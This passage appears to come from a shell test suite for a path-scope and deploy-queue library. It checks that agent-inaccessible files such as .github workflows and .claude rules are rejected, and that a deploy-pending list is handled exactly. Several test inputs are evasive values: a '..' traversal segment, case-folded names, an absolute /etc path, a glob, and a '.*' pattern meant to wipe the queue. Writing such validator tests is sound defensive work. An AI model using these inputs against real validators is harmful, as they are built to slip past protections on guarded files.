check "within: leading ./ normalized"       "yes" "$(hero_path_within ./src/app/x.ts src/app && echo yes || echo no)"
# Fails closed: an empty path or no scopes at all is NOT within. Reading an
# undeclared scope as an unlimited one removes the check from exactly the
# items whose scope nobody wrote down.
check "within: empty path is not within"    "no"  "$(hero_path_within '' src/app && echo yes || echo no)"
check "within: no scopes is not within"     "no"  "$(hero_path_within src/app/x.ts && echo yes || echo no)"
check "within: empty scope is skipped"      "no"  "$(hero_path_within src/app/x.ts '' && echo yes || echo no)"

# Never admissible, whatever DoD line is quoted.
check "forbidden: .github dir"              "yes" "$(hero_path_forbidden .github && echo yes || echo no)"
check "forbidden: the shared workflow"      "yes" "$(hero_path_forbidden .github/workflows/auto-approve.yaml && echo yes || echo no)"
check "forbidden: .claude rules"            "yes" "$(hero_path_forbidden .claude/rules/comments.md && echo yes || echo no)"
check "forbidden: HERO.md"                  "yes" "$(hero_path_forbidden HERO.md && echo yes || echo no)"
check "forbidden: FLEET.md"                 "yes" "$(hero_path_forbidden FLEET.md && echo yes || echo no)"
# Nested copies count too: a monorepo subproject's .github ships the same way.
check "forbidden: nested .github"           "yes" "$(hero_path_forbidden apps/web/.github/workflows/x.yaml && echo yes || echo no)"
check "forbidden: nested HERO.md"           "yes" "$(hero_path_forbidden packages/api/HERO.md && echo yes || echo no)"
check "forbidden: ./ prefixed"              "yes" "$(hero_path_forbidden ./.github/workflows/x.yaml && echo yes || echo no)"
check "forbidden: ordinary source is not"   "no"  "$(hero_path_forbidden src/app/api.ts && echo yes || echo no)"
# A file merely NAMED like one of them is ordinary source.
check "forbidden: HERO.md.bak is not"       "no"  "$(hero_path_forbidden docs/HERO.md.bak && echo yes || echo no)"
# Each of these could name a forbidden path without spelling it.
check "forbidden: nested dir, no trailing /" "yes" "$(hero_path_forbidden apps/web/.github && echo yes || echo no)"
check "forbidden: case-folded HERO.md"       "yes" "$(hero_path_forbidden hero.md && echo yes || echo no)"
check "forbidden: case-folded .GitHub"       "yes" "$(hero_path_forbidden .GitHub/workflows/x.yaml && echo yes || echo no)"
check "forbidden: a .. segment"              "yes" "$(hero_path_forbidden src/../.claude && echo yes || echo no)"
check "forbidden: a bare ."                  "yes" "$(hero_path_forbidden . && echo yes || echo no)"
check "forbidden: an absolute path"          "yes" "$(hero_path_forbidden /etc/x && echo yes || echo no)"
check "forbidden: a glob"                    "yes" "$(hero_path_forbidden 'src/**' && echo yes || echo no)"
if command -v zsh >/dev/null 2>&1; then
  check "within: segment rule holds under zsh" "no" "$(zsh -c ". '$LIB'; hero_path_within src/application/x.ts src/app" >/dev/null 2>&1 && echo yes || echo no)"
  check "forbidden: holds under zsh"           "yes" "$(zsh -c ". '$LIB'; hero_path_forbidden .github/workflows/x.yaml" >/dev/null 2>&1 && echo yes || echo no)"
fi

# ---------- deferred deploy checks ----------------------------------------
# The post-merge deploy probe is advisory, so it defers instead of sleeping.
SHA_A=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa1111
SHA_B=bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb2222
SHA_C=cccccccccccccccccccccccccccccccccccc3333
DS="$TMP/w5/.plans"; mkdir -p "$DS"
check "deploy pending: empty is rc 1"        "no"  "$(hero_deploy_pending "$DS" >/dev/null 2>&1 && echo yes || echo no)"
# rc 1 is "nothing owed" and rc 2 is "could not ask". Collapsing them is how a
# repo with a broken list reports a clean slate forever.
hero_deploy_pending "$TMP/no-such-store" >/dev/null 2>&1
check "deploy pending: bad store is rc 2"    "2"   "$?"
hero_deploy_pending_add "$DS" "$SHA_A" 41
hero_deploy_pending_add "$DS" "$SHA_B" 42
check "deploy pending: lists oldest first"   "$SHA_A $SHA_B" "$(hero_deploy_pending "$DS" | cut -f1 | tr '\n' ' ' | sed 's/ $//')"
check "deploy pending: carries the PR"       "41"  "$(hero_deploy_pending "$DS" | head -1 | cut -f2)"
# A re-run of the same merge (a resumed ship-pr) must not queue it twice, or
# the next session probes one deploy N times and reports it N times.
hero_deploy_pending_add "$DS" "$SHA_A" 41
check "deploy pending: add is idempotent"    "2"   "$(hero_deploy_pending "$DS" | wc -l | tr -d ' ')"
check "deploy pending: rejects a non-sha"    "no"  "$(hero_deploy_pending_add "$DS" 'not a sha' 43 >/dev/null 2>&1 && echo yes || echo no)"
# An abbreviated sha would be added but never cleared, since clear matches the
# whole field, so the entry is re-probed and re-reported forever.
check "deploy pending: rejects a short sha"  "no"  "$(hero_deploy_pending_add "$DS" abc123 43 >/dev/null 2>&1 && echo yes || echo no)"
# Blank is representable and, because dedupe is on the sha alone, permanent:
# a later add carrying the number is a no-op.
check "deploy pending: requires the PR"      "no"  "$(hero_deploy_pending_add "$DS" "$SHA_C" '' >/dev/null 2>&1 && echo yes || echo no)"
# The trailing TAB in clear's pattern is what stops a sha that is a prefix of
# another from clearing both. Tidy it away and the wrong merge is dropped.
hero_deploy_pending_add "$DS" "${SHA_A%1111}9999" 44
hero_deploy_pending_clear "$DS" "$SHA_A"
check "deploy pending: clear is exact, not a prefix" "yes" "$(hero_deploy_pending "$DS" | cut -f1 | grep -qxF "${SHA_A%1111}9999" && echo yes || echo no)"
hero_deploy_pending_clear "$DS" "${SHA_A%1111}9999"
check "deploy pending: clear drops one"      "$SHA_B" "$(hero_deploy_pending "$DS" | cut -f1)"
# The destructive half must validate what the additive half validates: `$2`
# is a BRE, so an unvalidated `.*` matches every line and the queue is gone.
check "deploy pending: clear rejects a non-sha" "no" "$(hero_deploy_pending_clear "$DS" '.*' >/dev/null 2>&1 && echo yes || echo no)"
check "deploy pending: a rejected clear kept the list" "$SHA_B" "$(hero_deploy_pending "$DS" | cut -f1)"
hero_deploy_pending_clear "$DS" "$SHA_B"
check "deploy pending: empty again after clear" "no" "$(hero_deploy_pending "$DS" >/dev/null 2>&1 && echo yes || echo no)"
# `.deploy-pending` is a DOTFILE, so plain `ls` never lists it and an `ls | wc`
# assertion here passes whether or not the file was removed.
check "deploy pending: no file left behind"  "no"  "$([ -e "$DS/.deploy-pending" ] && echo yes || echo no)"
check "deploy pending: no lock left behind"  "no"  "$([ -e "$DS/.deploy-pending.lock" ] && echo yes || echo no)"
check "deploy pending: clearing nothing is rc 0" "yes" "$(hero_deploy_pending_clear "$DS" "$SHA_A" >/dev/null 2>&1 && echo yes || echo no)"
# A line that lost its newline would fuse with the next append, and the fused
# line matches no sha, both entries become unclearable.
printf '%s\t9\t2026-01-01' "$SHA_C" > "$DS/.deploy-pending"
hero_deploy_pending_add "$DS" "$SHA_A" 45
check "deploy pending: heals a missing final newline" "$SHA_C $SHA_A" "$(hero_deploy_pending "$DS" | cut -f1 | tr '\n' ' ' | sed 's/ $//')"

R3="$TMP/r3"
mkdir -p "$R3/.claude/skills/plan-drift" "$R3/.claude/skills/plain" "$R3/.claude/skills/odd"
printf -- '---\nname: plan-drift\ndescription: d\nwayfare: sync\n---\n' > "$R3/.claude/skills/plan-drift/SKILL.md"
printf -- '---\nname: plain\ndescription: d\n---\n' > "$R3/.claude/skills/plain/SKILL.md"
printf -- '---\nname: odd\ndescription: d\nwayfare: deploy\n---\n' > "$R3/.claude/skills/odd/SKILL.md"
mkdir -p "$R3/.claude/skills/noname"
printf -- '---\ndescription: d\nwayfare: Verify\n---\n' > "$R3/.claude/skills/noname/SKILL.md"
check "local skills: only wayfare-tagged, valid hooks" "noname	verify	$R3/.claude/skills/noname/SKILL.md
plan-drift	sync	$R3/.claude/skills/plan-drift/SKILL.md" "$(hero_local_skills "$R3" 2>/dev/null)"
check "local skills: hook filter (positive)"          "plan-drift	sync	$R3/.claude/skills/plan-drift/SKILL.md" "$(hero_local_skills "$R3" sync 2>/dev/null)"
check "local skills: hook filter (negative)"          ""  "$(hero_local_skills "$R3" recipe 2>/dev/null)"
if command -v zsh >/dev/null 2>&1; then
  check "local skills: no skills dir under zsh is empty, rc 0" "yes" "$(zsh -c ". '$LIB'; hero_local_skills '$TMP/w' >/dev/null 2>&1 && echo yes || echo no")"
fi
check "local skills: unknown hook is named on stderr" "yes" "$(hero_local_skills "$R3" 2>&1 >/dev/null | grep -q "wayfare: 'deploy'" && echo yes || echo no)"
check "local skills: no skills dir is empty, rc 0"    "yes" "$(hero_local_skills "$TMP/w" >/dev/null 2>&1 && echo yes || echo no)"
W="$TMP/w/.plans"

if [ "$FAIL" -gt 0 ]; then
  echo "hero-lib: $PASS passed, $FAIL FAILED"
  exit 1
fi
# Floor on the case count. Neither suite runs under `set -e`, so a setup line
# that starts failing does not fail the run. It just stops incrementing PASS,
# and a block whose glob went empty runs zero iterations. Without this, a
# refactor that silently stops executing 25 cases still reports 0 failures and
# exits 0. The whole reason these cases exist is that each one could be wrong
# SILENTLY; the suite must not be able to go quiet the same way.
# Seven cases run only where zsh exists (macOS), so the floor is the count a
# Linux CI container reaches, not the local one. Kept TIGHT on purpose: a
# floor with a hundred cases of slack protects nothing, which is how this
# suite came to run 365 against a floor of 210. Raise it with every block you
# add, and read the CI number rather than the local one when you do.
MIN_CASES=381
if [ "$PASS" -lt "$MIN_CASES" ]; then
  echo "hero-lib: only $PASS cases ran, expected >= $MIN_CASES — a block stopped executing" >&2
  exit 1
fi
echo "hero-lib: $PASS passed"
